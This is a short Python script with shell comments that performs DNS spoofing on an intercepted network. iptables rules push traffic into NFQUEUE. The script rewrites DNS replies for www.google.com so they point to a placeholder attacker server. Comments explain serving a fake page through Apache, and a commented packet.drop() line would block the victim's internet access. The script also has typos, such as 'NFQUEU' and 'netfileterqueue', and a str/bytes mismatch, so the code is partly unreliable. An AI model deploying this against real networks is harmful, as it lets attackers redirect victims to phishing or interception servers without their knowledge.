# iptables -I FORWARD -j NFQUEUE --queue-num 0 -> can be automated using subprocess module
# pip install netfilterqueue
# iptables --flush --> To delete IP Tables created at the start

# iptables -I INPUT -j NFQUEU --queue-num 0 
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables --flush

#
#!/usr/bin/env python
import netfilterqueue # used because we can't modify packets using scapy 
import scapy.all as scapy
# scapy is used to sniff the packets (analyze and print them) and netfilterqueue (to modify packets we use netfilter) is used to modify the packets

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="HACKER-SERVER-IP") # rdata is the IP address of the server we want to redirect to
            scapy_packet[scapy.DNS].an = answer # an is the answer section of the DNS packet
            
            scapy_packet[scapy.DNS].ancount = 1 # ancount is the number of answers in the DNS packet
            del scapy_packet[scapy.IP].len # delete the length field of the IP packet to recalculate it
            del scapy_packet[scapy.IP].chksum # delete the checksum field of the IP packet to recalculate it
            del scapy_packet[scapy.UDP].len # delete the length field of the UDP packet to recalculate it
            del scapy_packet[scapy.UDP].chksum # delete the checksum field of the UDP packet to recalculate it
            packet.set_payload(bytes(scapy_packet)) # set the payload of the packet to the modified scapy packet
            
        print(scapy_packet.show())  
    packet.accept() # to forward the packets from victim to the destination
    # packet.drop() # to drop the packets from victim to the destination thereby blocking the internet access

queue = netfileterqueue.NetfilterQueue()
queue.bind(0, process_packet)  
queue.run()

#service apache2 start --> command to start apache server on kali linux
#/var/www/html/index.html --> file to be modified to show the custom page   
# ping -c 1 www.google.com